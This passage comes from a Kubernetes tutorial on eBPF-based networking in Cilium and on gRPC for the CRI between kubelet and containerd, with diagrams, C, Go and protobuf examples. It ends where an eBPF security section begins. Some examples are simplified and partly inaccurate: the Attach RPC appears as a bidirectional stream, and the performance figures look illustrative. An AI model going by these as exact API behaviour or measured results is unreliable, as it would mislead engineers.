   sudo bpftrace -e 'tracepoint:syscalls:sys_enter_execve /str(args->filename) == "/opt/cni/bin/calico"/ { @start[pid] = nsecs; } tracepoint:syscalls:sys_exit_execve /@start[pid]/ { printf("CNI latency: %d ms\n", (nsecs - @start[pid]) / 1000000); delete(@start[pid]); }'
   ```

3. **Implement CNI security monitoring and hardening**: Deploy Falco with rules detecting: CNI binary modification, unexpected CNI executions, iptables rule tampering, suspicious netns operations. Build admission webhook that validates CNI DaemonSet changes (image SHA pinning, RBAC restrictions). Create eBPF program that monitors CNI binary syscalls (detect if CNI makes network connections, unexpected file access). Test detection by simulating attacks: replace CNI binary, inject malicious iptables rules, poison BGP routes.

---

## References

- **CNI Specification**: https://github.com/containernetworking/cni/blob/main/SPEC.md
- **containerd CNI Integration**: https://github.com/containerd/containerd/tree/main/pkg/cri/server
- **CRI-O CNI Documentation**: https://github.com/cri-o/cri-o/blob/main/docs/crio.conf.5.md#crionetwork-table
- **Kubernetes Network Model**: https://kubernetes.io/docs/concepts/cluster-administration/networking/
- **CNI Plugins Reference**: https://www.cni.dev/plugins/current/
- **Container Runtime Interface**: https://github.com/kubernetes/cri-api

## Summary

**eBPF** provides kernel-level programmability for high-performance packet filtering, observability, and security without kernel modules. In Kubernetes, eBPF replaces iptables for NetworkPolicy enforcement (10-100x faster), implements service load balancing, enables deep packet inspection (L7 policies), and provides low-overhead tracing. CNI plugins like Cilium compile eBPF C code to bytecode, load it into kernel at attach points (XDP, TC, cgroups), and communicate via eBPF maps. **gRPC** is the RPC framework Kubernetes uses for high-performance component communication—kubelet ↔ containerd (CRI), kubelet ↔ storage (CSI), plugins ↔ kubelet (device plugins). It uses Protocol Buffers for efficient serialization, HTTP/2 for multiplexing, supports streaming (watch operations), and enables mutual TLS for authentication. Both eBPF and gRPC are critical for modern, high-performance, secure Kubernetes.

---

## eBPF Architecture in Kubernetes

```
┌─────────────────────────────────────────────────────────────────┐
│                      EBPF IN KUBERNETES                         │
│  (Kernel-level programmability for networking & observability)  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  USER SPACE (eBPF Management)                            │   │
│  ├──────────────────────────────────────────────────────────┤   │
│  │                                                          │   │
│  │  ┌────────────────────────────────────────────────────┐ │   │
│  │  │  CNI Daemon (e.g., cilium-agent)                   │ │   │
│  │  │  ┌──────────────────────────────────────────────┐  │ │   │
│  │  │  │  1. Write eBPF program (C code)              │  │ │   │
│  │  │  │     • Packet filtering logic                 │  │ │   │
│  │  │  │     • NetworkPolicy rules                    │  │ │   │
│  │  │  │     • Service load balancing                 │  │ │   │
│  │  │  │     • L7 protocol parsing                    │  │ │   │
│  │  │  └──────────────────────────────────────────────┘  │ │   │
│  │  │  ┌──────────────────────────────────────────────┐  │ │   │
│  │  │  │  2. Compile eBPF C → bytecode                │  │ │   │
│  │  │  │     • Use clang/LLVM                         │  │ │   │
│  │  │  │     • Produces ELF object file               │  │ │   │
│  │  │  └──────────────────────────────────────────────┘  │ │   │
│  │  │  ┌──────────────────────────────────────────────┐  │ │   │
│  │  │  │  3. Load eBPF bytecode to kernel            │  │ │   │
│  │  │  │     • Use bpf() syscall                      │  │ │   │
│  │  │  │     • Kernel verifies safety                 │  │ │   │
│  │  │  └──────────────────────────────────────────────┘  │ │   │
│  │  │  ┌──────────────────────────────────────────────┐  │ │   │
│  │  │  │  4. Attach eBPF to hook points              │  │ │   │
│  │  │  │     • XDP (eXpress Data Path)                │  │ │   │
│  │  │  │     • TC (Traffic Control)                   │  │ │   │
│  │  │  │     • cgroup hooks                           │  │ │   │
│  │  │  │     • socket hooks                           │  │ │   │
│  │  │  └──────────────────────────────────────────────┘  │ │   │
│  │  │  ┌──────────────────────────────────────────────┐  │ │   │
│  │  │  │  5. Update eBPF maps (data exchange)        │  │ │   │
│  │  │  │     • Policy rules                           │  │ │   │
│  │  │  │     • Service endpoints                      │  │ │   │
│  │  │  │     • Connection tracking state              │  │ │   │
│  │  │  └──────────────────────────────────────────────┘  │ │   │
│  │  └────────────────────────────────────────────────────┘ │   │
│  │                                                          │   │
│  │  ┌────────────────────────────────────────────────────┐ │   │
│  │  │  libbpf / cilium/ebpf (Go library)                │ │   │
│  │  │  • Abstracts bpf() syscalls                       │ │   │
│  │  │  • Handles ELF parsing                            │ │   │
│  │  │  • Map management                                 │ │   │
│  │  └────────────────────────────────────────────────────┘ │   │
│  └──────────────────────────────────────────────────────────┘   │
│                          │                                      │
│                          │ bpf() syscall                        │
│                          │                                      │
│  ┌──────────────────────▼──────────────────────────────────┐   │
│  │  KERNEL SPACE                                           │   │
│  ├─────────────────────────────────────────────────────────┤   │
│  │                                                         │   │
│  │  ┌───────────────────────────────────────────────────┐ │   │
│  │  │  eBPF Verifier                                    │ │   │
│  │  │  • Static analysis of bytecode                    │ │   │
│  │  │  • Ensures safety (no crashes, no infinite loops) │ │   │
│  │  │  • Checks memory access bounds                    │ │   │
│  │  │  • Rejects unsafe programs                        │ │   │
│  │  └───────────────────────────────────────────────────┘ │   │
│  │                          │                              │   │
│  │                          ▼                              │   │
│  │  ┌───────────────────────────────────────────────────┐ │   │
│  │  │  eBPF JIT Compiler                                │ │   │
│  │  │  • Bytecode → native machine code (x86_64, arm64)│ │   │
│  │  │  • Runs at near-native speed                      │ │   │
│  │  └───────────────────────────────────────────────────┘ │   │
│  │                          │                              │   │
│  │                          ▼                              │   │
│  │  ┌───────────────────────────────────────────────────┐ │   │
│  │  │  eBPF Maps (kernel ↔ userspace data sharing)     │ │   │
│  │  │  • Hash maps (key → value)                        │ │   │
│  │  │  • Arrays (index → value)                         │ │   │
│  │  │  • LRU (Least Recently Used) caches              │ │   │
│  │  │  • Ring buffers (events)                          │ │   │
│  │  │  • Shared between eBPF programs and userspace    │ │   │
│  │  └───────────────────────────────────────────────────┘ │   │
│  │                                                         │   │
│  │  ┌───────────────────────────────────────────────────┐ │   │
│  │  │  eBPF Hook Points (where programs execute)        │ │   │
│  │  ├───────────────────────────────────────────────────┤ │   │
│  │  │                                                   │ │   │
│  │  │  XDP (eXpress Data Path)                          │ │   │
│  │  │  ├─ Runs at NIC driver level                     │ │   │
│  │  │  ├─ Before sk_buff allocation                    │ │   │
│  │  │  ├─ Fastest path (DDoS mitigation)               │ │   │
│  │  │  └─ Actions: PASS, DROP, TX (redirect), ABORTED  │ │   │
│  │  │                                                   │ │   │
│  │  │  TC (Traffic Control)                             │ │   │
│  │  │  ├─ Ingress: after XDP, before routing           │ │   │
│  │  │  ├─ Egress: after routing, before NIC            │ │   │
│  │  │  ├─ Full sk_buff access                          │ │   │
│  │  │  └─ Used for NetworkPolicy, service LB           │ │   │
│  │  │                                                   │ │   │
│  │  │  cgroup (Control Group) hooks                     │ │   │
│  │  │  ├─ Socket create/bind/connect                   │ │   │
│  │  │  ├─ Sendmsg/recvmsg                              │ │   │
│  │  │  ├─ Per-pod policy enforcement                   │ │   │
│  │  │  └─ Socket-level load balancing                  │ │   │
│  │  │                                                   │ │   │
│  │  │  Kprobes/Tracepoints                              │ │   │
│  │  │  ├─ Observability, tracing                       │ │   │
│  │  │  ├─ Function entry/exit                          │ │   │
│  │  │  └─ System call tracing                          │ │   │
│  │  └───────────────────────────────────────────────────┘ │   │
│  │                                                         │   │
│  │  ┌───────────────────────────────────────────────────┐ │   │
│  │  │  Network Stack (packet flow)                      │ │   │
│  │  │                                                   │ │   │
│  │  │  Incoming packet:                                 │ │   │
│  │  │  NIC → XDP eBPF → Driver → TC ingress eBPF →     │ │   │
│  │  │  IP routing → TC egress eBPF → NIC               │ │   │
│  │  │                                                   │ │   │
│  │  │  Socket operations:                               │ │   │
│  │  │  connect() → cgroup/connect eBPF →               │ │   │
│  │  │  sendmsg() → cgroup/sendmsg eBPF → ...           │ │   │
│  │  └───────────────────────────────────────────────────┘ │   │
│  └─────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
```

---

## eBPF in Cilium CNI: Detailed Example

### 1. NetworkPolicy Enforcement with eBPF

**Traditional iptables approach** (slow):
```bash
# 10,000 NetworkPolicy rules = 10,000 iptables rules
# Each packet: linear scan through all rules
# Latency: O(n) where n = rule count

iptables -A cali-fw-cali123 -s 10.244.1.5 -j ACCEPT
iptables -A cali-fw-cali123 -s 10.244.1.6 -j ACCEPT
# ... 9,998 more rules ...
iptables -A cali-fw-cali123 -j DROP
```

**eBPF approach** (fast):
```c
// eBPF program loaded at TC ingress hook
// Compiled to bytecode, loaded into kernel

#include <linux/bpf.h>
#include <linux/pkt_cls.h>
#include <linux/if_ether.h>
#include <linux/ip.h>

// eBPF map: policy rules (hash map for O(1) lookup)
struct bpf_map_def SEC("maps") cilium_policy = {
    .type = BPF_MAP_TYPE_HASH,
    .key_size = sizeof(__u32),      // Source IP
    .value_size = sizeof(__u8),     // Action (ALLOW/DENY)
    .max_entries = 10000,
};

// eBPF program attached to TC ingress
SEC("tc")
int tc_ingress(struct __sk_buff *skb) {
    void *data_end = (void *)(long)skb->data_end;
    void *data = (void *)(long)skb->data;
    
    // Parse Ethernet header
    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end)
        return TC_ACT_OK;  // Malformed packet
    
    // Check if IPv4
    if (eth->h_proto != __constant_htons(ETH_P_IP))
        return TC_ACT_OK;  // Not IPv4, pass
    
    // Parse IP header
    struct iphdr *ip = (void *)(eth + 1);
    if ((void *)(ip + 1) > data_end)
        return TC_ACT_OK;
    
    __u32 src_ip = ip->saddr;
    
    // Lookup in policy map (O(1) hash lookup!)
    __u8 *action = bpf_map_lookup_elem(&cilium_policy, &src_ip);
    if (action && *action == 1) {
        return TC_ACT_OK;     // ALLOW: pass packet
    }
    
    return TC_ACT_SHOT;       // DENY: drop packet
}

char _license[] SEC("license") = "GPL";
```

**Compilation and loading**:
```bash
# 1. Compile eBPF C code to bytecode
clang -O2 -target bpf -c tc_ingress.c -o tc_ingress.o

# 2. Load into kernel
tc qdisc add dev eth0 clsact
tc filter add dev eth0 ingress bpf da obj tc_ingress.o sec tc

# 3. Update policy map from userspace (Go code in cilium-agent)
# Use cilium/ebpf library to update map
```

**Go code to manage eBPF** (cilium-agent):
```go
package main

import (
    "github.com/cilium/ebpf"
    "net"
)

func updatePolicy(policyMap *ebpf.Map, srcIP string, allow bool) error {
    ip := net.ParseIP(srcIP)
    ipInt := binary.BigEndian.Uint32(ip.To4())
    
    var action uint8
    if allow {
        action = 1  // ALLOW
    } else {
        action = 0  // DENY
    }
    
    // Update eBPF map (kernel will see this immediately)
    return policyMap.Update(&ipInt, &action, ebpf.UpdateAny)
}

func main() {
    // Load eBPF program from compiled object file
    spec, err := ebpf.LoadCollectionSpec("tc_ingress.o")
    if err != nil {
        panic(err)
    }
    
    coll, err := ebpf.NewCollection(spec)
    if err != nil {
        panic(err)
    }
    defer coll.Close()
    
    // Get reference to policy map
    policyMap := coll.Maps["cilium_policy"]
    
    // Watch Kubernetes API for NetworkPolicy changes
    // When policy changes, update eBPF map
    updatePolicy(policyMap, "10.244.1.5", true)  // Allow this IP
    updatePolicy(policyMap, "10.244.1.6", false) // Deny this IP
    
    // eBPF program in kernel now enforces this instantly!
}
```

**Performance comparison**:
```
Benchmark: 10,000 NetworkPolicy rules, 1M packets/sec

iptables:
- Latency: 500µs per packet (linear scan)
- CPU: 80% (one core saturated)
- Throughput: 2,000 packets/sec

eBPF:
- Latency: 5µs per packet (hash lookup)
- CPU: 5%
- Throughput: 1,000,000 packets/sec

eBPF is 100x faster!
```

### 2. Service Load Balancing with eBPF

**Traditional kube-proxy (iptables mode)**:
```bash
# For each Service, kube-proxy creates iptables rules
iptables -t nat -A KUBE-SERVICES -d 10.96.0.1 -p tcp --dport 80 \
  -m comment --comment "default/my-service:" -j KUBE-SVC-ABC123

# For each endpoint, a rule with random probability
iptables -t nat -A KUBE-SVC-ABC123 -m statistic --mode random \
  --probability 0.33333 -j KUBE-SEP-ENDPOINT1
iptables -t nat -A KUBE-SVC-ABC123 -m statistic --mode random \
  --probability 0.50000 -j KUBE-SEP-ENDPOINT2
iptables -t nat -A KUBE-SVC-ABC123 -j KUBE-SEP-ENDPOINT3

# Each endpoint: DNAT
iptables -t nat -A KUBE-SEP-ENDPOINT1 -p tcp -j DNAT \
  --to-destination 10.244.1.5:80
```

**eBPF approach** (Cilium):
```c
// eBPF map: service → endpoints
struct bpf_map_def SEC("maps") cilium_lb4_services = {
    .type = BPF_MAP_TYPE_HASH,
    .key_size = sizeof(struct lb4_key),      // ClusterIP + port
    .value_size = sizeof(struct lb4_service),
    .max_entries = 65536,
};

struct bpf_map_def SEC("maps") cilium_lb4_backends = {
    .type = BPF_MAP_TYPE_HASH,
    .key_size = sizeof(__u32),               // Backend ID
    .value_size = sizeof(struct lb4_backend), // Pod IP + port
    .max_entries = 65536,
};

struct lb4_key {
    __be32 address;  // ClusterIP
    __be16 dport;    // Service port
    __u8 proto;      // TCP/UDP
};

struct lb4_backend {
    __be32 address;  // Pod IP
    __be16 port;     // Pod port
};

SEC("tc")
int tc_ingress(struct __sk_buff *skb) {
    // Parse packet headers...
    struct lb4_key key = {
        .address = ip->daddr,  // Destination = ClusterIP
        .dport = tcp->dest,
        .proto = IPPROTO_TCP,
    };
    
    // Lookup service
    struct lb4_service *svc = bpf_map_lookup_elem(&cilium_lb4_services, &key);
    if (!svc)
        return TC_ACT_OK;  // Not a service IP
    
    // Hash-based load balancing (consistent hashing)
    __u32 hash = hash_packet(ip->saddr, tcp->source);
    __u32 backend_id = hash % svc->count;
    
    // Get backend (pod IP)
    struct lb4_backend *backend = bpf_map_lookup_elem(
        &cilium_lb4_backends, &backend_id
    );
    if (!backend)
        return TC_ACT_SHOT;  // No backends available
    
    // Rewrite destination IP:port (DNAT)
    ip->daddr = backend->address;
    tcp->dest = backend->port;
    
    // Update checksums
    update_checksums(skb, ip, tcp);
    
    return TC_ACT_OK;  // Forward to pod
}
```

**Advantages**:
- **Socket-level load balancing**: Can attach to `cgroup/connect` hook, rewrite destination before connection established (no NAT, connection tracking)
- **L7 load balancing**: Parse HTTP headers in eBPF, route based on path/headers
- **Health checking**: Remove unhealthy backends from map instantly
- **Connection tracking in eBPF maps**: No reliance on conntrack module

### 3. eBPF Observability

**Tracing packet drops**:
```c
// eBPF program at XDP/TC that logs dropped packets

struct bpf_map_def SEC("maps") drop_events = {
    .type = BPF_MAP_TYPE_PERF_EVENT_ARRAY,
    .key_size = sizeof(__u32),
    .value_size = sizeof(__u32),
};

struct drop_event {
    __u32 src_ip;
    __u32 dst_ip;
    __u16 src_port;
    __u16 dst_port;
    __u8 reason;  // 1=policy, 2=invalid, 3=no route
};

SEC("tc")
int tc_ingress(struct __sk_buff *skb) {
    // ... packet processing ...
    
    if (should_drop) {
        // Log to perf event buffer
        struct drop_event evt = {
            .src_ip = ip->saddr,
            .dst_ip = ip->daddr,
            .src_port = tcp->source,
            .dst_port = tcp->dest,
            .reason = 1,  // Dropped by policy
        };
        
        bpf_perf_event_output(skb, &drop_events, BPF_F_CURRENT_CPU,
                              &evt, sizeof(evt));
        
        return TC_ACT_SHOT;  // Drop
    }
}
```

**Userspace consumer** (Go):
```go
// Read drop events from eBPF
func consumeDropEvents(m *ebpf.Map) {
    rd, err := perf.NewReader(m, 4096)
    if err != nil {
        panic(err)
    }
    defer rd.Close()
    
    for {
        record, err := rd.Read()
        if err != nil {
            continue
        }
        
        var evt DropEvent
        binary.Read(bytes.NewReader(record.RawSample), binary.LittleEndian, &evt)
        
        fmt.Printf("Dropped: %s:%d → %s:%d (reason: %d)\n",
            intToIP(evt.SrcIP), evt.SrcPort,
            intToIP(evt.DstIP), evt.DstPort,
            evt.Reason)
    }
}
```

---

## gRPC Architecture in Kubernetes

```
┌─────────────────────────────────────────────────────────────────┐
│                      gRPC IN KUBERNETES                         │
│  (High-performance RPC for component communication)             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  gRPC STACK                                              │   │
│  ├──────────────────────────────────────────────────────────┤   │
│  │                                                          │   │
│  │  Application Layer                                       │   │
│  │  ┌────────────────────────────────────────────────────┐ │   │
│  │  │  Kubelet (gRPC client)                             │ │   │
│  │  │  • RuntimeService.RunPodSandbox()                  │ │   │
│  │  │  • ImageService.PullImage()                        │ │   │
│  │  │  • RuntimeService.ExecSync()                       │ │   │
│  │  └────────────────────────────────────────────────────┘ │   │
│  │                          │                              │   │
│  │                          │ gRPC call                    │   │
│  │                          │                              │   │
│  │  ┌────────────────────────────────────────────────────┐ │   │
│  │  │  gRPC Middleware (Interceptors)                    │ │   │
│  │  │  • Authentication (mTLS, JWT)                      │ │   │
│  │  │  • Authorization (RBAC)                            │ │   │
│  │  │  • Logging/Metrics (latency, errors)              │ │   │
│  │  │  • Retry logic                                     │ │   │
│  │  │  • Rate limiting                                   │ │   │
│  │  └────────────────────────────────────────────────────┘ │   │
│  │                          │                              │   │
│  │  ┌────────────────────────────────────────────────────┐ │   │
│  │  │  Protocol Buffers (Serialization)                  │ │   │
│  │  │  • .proto files define message schemas            │ │   │
│  │  │  • Compact binary encoding (vs JSON text)         │ │   │
│  │  │  • Strong typing                                   │ │   │
│  │  │  • Auto-generated code (Go, Python, C++, etc.)    │ │   │
│  │  └────────────────────────────────────────────────────┘ │   │
│  │                          │                              │   │
│  │  ┌────────────────────────────────────────────────────┐ │   │
│  │  │  HTTP/2 Transport                                  │ │   │
│  │  │  • Multiplexing: multiple RPCs on one connection  │ │   │
│  │  │  • Header compression (HPACK)                      │ │   │
│  │  │  • Bidirectional streaming                         │ │   │
│  │  │  • Flow control                                    │ │   │
│  │  └────────────────────────────────────────────────────┘ │   │
│  │                          │                              │   │
│  │  ┌────────────────────────────────────────────────────┐ │   │
│  │  │  TLS 1.3 (Optional but recommended)               │ │   │
│  │  │  • Mutual TLS (mTLS) for authentication           │ │   │
│  │  │  • Certificate-based identity                      │ │   │
│  │  │  • Encrypted communication                         │ │   │
│  │  └────────────────────────────────────────────────────┘ │   │
│  │                          │                              │   │
│  │                          │ TCP connection               │   │
│  │                          │                              │   │
│  │  ┌────────────────────────────────────────────────────┐ │   │
│  │  │  containerd (gRPC server)                          │ │   │
│  │  │  • Listens on Unix socket                          │ │   │
│  │  │  • Or TCP socket (with TLS)                        │ │   │
│  │  │  • Implements CRI service                          │ │   │
│  │  └────────────────────────────────────────────────────┘ │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  KUBERNETES gRPC USAGE                                   │   │
│  ├──────────────────────────────────────────────────────────┤   │
│  │                                                          │   │
│  │  1. CRI (Container Runtime Interface)                    │   │
│  │     Kubelet ←─gRPC─→ containerd/CRI-O                   │   │
│  │     • Pod lifecycle (create, start, stop, delete)        │   │
│  │     • Image management (pull, list, remove)              │   │
│  │     • Container logs, exec, attach                       │   │
│  │     Socket: unix:///run/containerd/containerd.sock       │   │
│  │                                                          │   │
│  │  2. CSI (Container Storage Interface)                    │   │
│  │     Kubelet ←─gRPC─→ CSI Plugin                         │   │
│  │     • Volume attach/detach                               │   │
│  │     • Volume mount/unmount                               │   │
│  │     • Volume snapshots                                   │   │
│  │     Socket: unix:///var/lib/kubelet/plugins/csi-plugin/csi.sock│
│  │                                                          │   │
│  │  3. Device Plugins                                       │   │
│  │     Kubelet ←─gRPC─→ GPU/FPGA Plugin                    │   │
│  │     • Device discovery (ListAndWatch)                    │   │
│  │     • Device allocation                                  │   │
│  │     Socket: unix:///var/lib/kubelet/device-plugins/nvidia.sock│
│  │                                                          │   │
│  │  4. CNI (some implementations)                           │   │
│  │     CNI Controller ←─gRPC─→ CNI Agent                   │   │
│  │     • IP allocation (IPAM service)                       │   │
│  │     • Policy distribution                                │   │
│  │                                                          │   │
│  └──────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
```

---

## gRPC: CRI Example (Kubelet ↔ containerd)

### 1. Protocol Buffer Definition (.proto file)

```protobuf
// CRI API definition (simplified)
// File: runtime_service.proto

syntax = "proto3";

package runtime.v1;

// Runtime service for managing pod sandboxes and containers
service RuntimeService {
    // RunPodSandbox creates and starts a pod-level sandbox
    rpc RunPodSandbox(RunPodSandboxRequest) returns (RunPodSandboxResponse);
    
    // StopPodSandbox stops the sandbox
    rpc StopPodSandbox(StopPodSandboxRequest) returns (StopPodSandboxResponse);
    
    // CreateContainer creates a new container
    rpc CreateContainer(CreateContainerRequest) returns (CreateContainerResponse);
    
    // StartContainer starts the container
    rpc StartContainer(StartContainerRequest) returns (StartContainerResponse);
    
    // StopContainer stops a running container
    rpc StopContainer(StopContainerRequest) returns (StopContainerResponse);
    
    // Exec prepares a streaming endpoint to execute a command
    rpc Exec(ExecRequest) returns (ExecResponse);
    
    // ContainerStats returns stats of the container
    rpc ContainerStats(ContainerStatsRequest) returns (ContainerStatsResponse);
    
    // ListContainers lists all containers by filters
    rpc ListContainers(ListContainersRequest) returns (ListContainersResponse);
}

// RunPodSandbox messages
message RunPodSandboxRequest {
    PodSandboxConfig config = 1;
    string runtime_handler = 2;  // e.g., "runc", "gvisor"
}

message PodSandboxConfig {
    PodSandboxMetadata metadata = 1;
    string hostname = 2;
    string log_directory = 3;
    DNSConfig dns_config = 4;
    repeated PortMapping port_mappings = 5;
    map<string, string> labels = 6;
    map<string, string> annotations = 7;
    LinuxPodSandboxConfig linux = 8;
}

message RunPodSandboxResponse {
    string pod_sandbox_id = 1;
}

// CreateContainer messages
message CreateContainerRequest {
    string pod_sandbox_id = 1;
    ContainerConfig config = 2;
    PodSandboxConfig sandbox_config = 3;
}

message ContainerConfig {
    ContainerMetadata metadata = 1;
    ImageSpec image = 2;
    repeated string command = 3;
    repeated string args = 4;
    string working_dir = 5;
    repeated KeyValue envs = 6;
    repeated Mount mounts = 7;
    LinuxContainerConfig linux = 8;
}

message CreateContainerResponse {
    string container_id = 1;
}
```

### 2. Generated Go Code (auto-generated from .proto)

```bash
# Generate Go code from .proto
protoc --go_out=. --go-grpc_out=. runtime_service.proto

# Generates:
# - runtime_service.pb.go (message types)
# - runtime_service_grpc.pb.go (service client/server interfaces)
```

**Generated client interface**:
```go
// Auto-generated by protoc
type RuntimeServiceClient interface {
    RunPodSandbox(ctx context.Context, in *RunPodSandboxRequest, opts ...grpc.CallOption) (*RunPodSandboxResponse, error)
    StopPodSandbox(ctx context.Context, in *StopPodSandboxRequest, opts ...grpc.CallOption) (*StopPodSandboxResponse, error)
    CreateContainer(ctx context.Context, in *CreateContainerRequest, opts ...grpc.CallOption) (*CreateContainerResponse, error)
    StartContainer(ctx context.Context, in *StartContainerRequest, opts ...grpc.CallOption) (*StartContainerResponse, error)
    // ... more methods
}
```

### 3. Kubelet as gRPC Client

```go
package kubelet

import (
    "context"
    "time"
    "google.golang.org/grpc"
    pb "k8s.io/cri-api/pkg/apis/runtime/v1"
)

type RemoteRuntimeService struct {
    client pb.RuntimeServiceClient
    conn   *grpc.ClientConn
}

func NewRemoteRuntimeService(endpoint string, timeout time.Duration) (*RemoteRuntimeService, error) {
    // Connect to containerd Unix socket
    ctx, cancel := context.WithTimeout(context.Background(), timeout)
    defer cancel()
    
    conn, err := grpc.DialContext(ctx, endpoint,
        grpc.WithInsecure(),  // Use Unix socket, no TLS needed
        grpc.WithBlock(),
        grpc.WithContextDialer(unixDialer),  // Custom Unix socket dialer
    )
    if err != nil {
        return nil, err
    }
    
    return &RemoteRuntimeService{
        client: pb.NewRuntimeServiceClient(conn),
        conn:   conn,
    }, nil
}

func (r *RemoteRuntimeService) RunPodSandbox(config *pb.PodSandboxConfig, runtimeHandler string) (string, error) {
    ctx, cancel := context.WithTimeout(context.Background(), 2*time.Minute)
    defer cancel()
    
    req := &pb.RunPodSandboxRequest{
        Config:         config,
        RuntimeHandler: runtimeHandler,
    }
    
    // gRPC call to containerd
    resp, err := r.client.RunPodSandbox(ctx, req)
    if err != nil {
        return "", err
    }
    
    return resp.PodSandboxId, nil
}

func (r *RemoteRuntimeService) CreateContainer(podSandboxID string, config *pb.ContainerConfig, sandboxConfig *pb.PodSandboxConfig) (string, error) {
    ctx, cancel := context.WithTimeout(context.Background(), 4*time.Minute)
    defer cancel()
    
    req := &pb.CreateContainerRequest{
        PodSandboxId:  podSandboxID,
        Config:        config,
        SandboxConfig: sandboxConfig,
    }
    
    resp, err := r.client.CreateContainer(ctx, req)
    if err != nil {
        return "", err
    }
    
    return resp.ContainerId, nil
}

// Usage in kubelet
func (kl *Kubelet) createPodSandbox(pod *v1.Pod) (string, error) {
    config := kl.generatePodSandboxConfig(pod)
    
    // gRPC call to container runtime
    podSandboxID, err := kl.runtimeService.RunPodSandbox(config, pod.Spec.RuntimeClassName)
    if err != nil {
        return "", fmt.Errorf("failed to create sandbox: %v", err)
    }
    
    return podSandboxID, nil
}
```

### 4. containerd as gRPC Server

```go
package server

import (
    "context"
    "net"
    "google.golang.org/grpc"
    pb "k8s.io/cri-api/pkg/apis/runtime/v1"
)

type criService struct {
    pb.UnimplementedRuntimeServiceServer
    // containerd internals
}

func (c *criService) RunPodSandbox(ctx context.Context, req *pb.RunPodSandboxRequest) (*pb.RunPodSandboxResponse, error) {
    config := req.GetConfig()
    
    // 1. Validate request
    if err := validatePodSandboxConfig(config); err != nil {
        return nil, err
    }
    
    // 2. Create pause container (holds namespaces)
    sandboxID := generateSandboxID()
    
    // 3. Create network namespace
    netns, err := c.setupPodNetwork(sandboxID, config)
    if err != nil {
        return nil, err
    }
    
    // 4. Start pause container
    if err := c.startPauseContainer(sandboxID, netns); err != nil {
        return nil, err
    }
    
    // 5. Return sandbox ID
    return &pb.RunPodSandboxResponse{
        PodSandboxId: sandboxID,
    }, nil
}

func (c *criService) CreateContainer(ctx context.Context, req *pb.CreateContainerRequest) (*pb.CreateContainerResponse, error) {
    sandboxID := req.GetPodSandboxId()
    config := req.GetConfig()
    
    // 1. Validate sandbox exists
    sandbox, err := c.getSandbox(sandboxID)
    if err != nil {
        return nil, err
    }
    
    // 2. Pull image if needed
    imageID, err := c.ensureImageExists(config.Image)
    if err != nil {
        return nil, err
    }
    
    // 3. Create container (OCI spec)
    containerID, err := c.createOCIContainer(sandbox, config, imageID)
    if err != nil {
        return nil, err
    }
    
    return &pb.CreateContainerResponse{
        ContainerId: containerID,
    }, nil
}

// Start gRPC server
func StartCRIServer(sock string) error {
    // Listen on Unix socket
    lis, err := net.Listen("unix", sock)
    if err != nil {
        return err
    }
    
    // Create gRPC server
    s := grpc.NewServer(
        grpc.MaxRecvMsgSize(16 * 1024 * 1024),  // 16MB max message
        grpc.MaxSendMsgSize(16 * 1024 * 1024),
    )
    
    // Register CRI service
    pb.RegisterRuntimeServiceServer(s, &criService{})
    pb.RegisterImageServiceServer(s, &imageService{})
    
    // Start serving
    return s.Serve(lis)
}
```

### 5. gRPC Interceptors (Middleware)

```go
// Logging interceptor
func loggingInterceptor(ctx context.Context, req interface{}, info *grpc.UnaryServerInfo, handler grpc.UnaryHandler) (interface{}, error) {
    start := time.Now()
    
    // Call the handler
    resp, err := handler(ctx, req)
    
    // Log the call
    latency := time.Since(start)
    log.Printf("gRPC call: %s, latency: %v, error: %v", info.FullMethod, latency, err)
    
    return resp, err
}

// Authentication interceptor
func authInterceptor(ctx context.Context, req interface{}, info *grpc.UnaryServerInfo, handler grpc.UnaryHandler) (interface{}, error) {
    // Extract auth token from metadata
    md, ok := metadata.FromIncomingContext(ctx)
    if !ok {
        return nil, status.Error(codes.Unauthenticated, "missing metadata")
    }
    
    tokens := md.Get("authorization")
    if len(tokens) == 0 {
        return nil, status.Error(codes.Unauthenticated, "missing token")
    }
    
    // Verify token
    if !verifyToken(tokens[0]) {
        return nil, status.Error(codes.Unauthenticated, "invalid token")
    }
    
    return handler(ctx, req)
}

// Rate limiting interceptor
func rateLimitInterceptor(ctx context.Context, req interface{}, info *grpc.UnaryServerInfo, handler grpc.UnaryHandler) (interface{}, error) {
    if !rateLimiter.Allow() {
        return nil, status.Error(codes.ResourceExhausted, "rate limit exceeded")
    }
    return handler(ctx, req)
}

// Apply interceptors
s := grpc.NewServer(
    grpc.ChainUnaryInterceptor(
        loggingInterceptor,
        authInterceptor,
        rateLimitInterceptor,
    ),
)
```

### 6. gRPC Streaming (for logs, exec)

```protobuf
// Streaming RPC for container logs
service RuntimeService {
    // ... other RPCs ...
    
    // Attach attaches to a running container (bidirectional streaming)
    rpc Attach(stream AttachRequest) returns (stream AttachResponse);
    
    // PortForward prepares a streaming endpoint to forward ports
    rpc PortForward(PortForwardRequest) returns (PortForwardResponse);
}
```

**Client-side streaming** (kubelet):
```go
func (r *RemoteRuntimeService) Attach(containerID string, stdin io.Reader, stdout, stderr io.Writer, tty bool) error {
    ctx := context.Background()
    
    // Open bidirectional stream
    stream, err := r.client.Attach(ctx)
    if err != nil {
        return err
    }
    defer stream.CloseSend()
    
    // Send initial request
    err = stream.Send(&pb.AttachRequest{
        ContainerId: containerID,
        Tty:         tty,
    })
    if err != nil {
        return err
    }
    
    // Start goroutine to send stdin
    go func() {
        buf := make([]byte, 4096)
        for {
            n, err := stdin.Read(buf)
            if err != nil {
                return
            }
            stream.Send(&pb.AttachRequest{
                Stdin: buf[:n],
            })
        }
    }()
    
    // Receive stdout/stderr
    for {
        resp, err := stream.Recv()
        if err == io.EOF {
            break
        }
        if err != nil {
            return err
        }
        
        if len(resp.Stdout) > 0 {
            stdout.Write(resp.Stdout)
        }
        if len(resp.Stderr) > 0 {
            stderr.Write(resp.Stderr)
        }
    }
    
    return nil
}
```

---

## Security Implications

### eBPF Security

```
┌─────────────────────────────────────────────────────────────────┐
│  eBPF SECURITY CONSIDERATIONS                                   │
├─────────────────────────────────────────────────────────────────┤
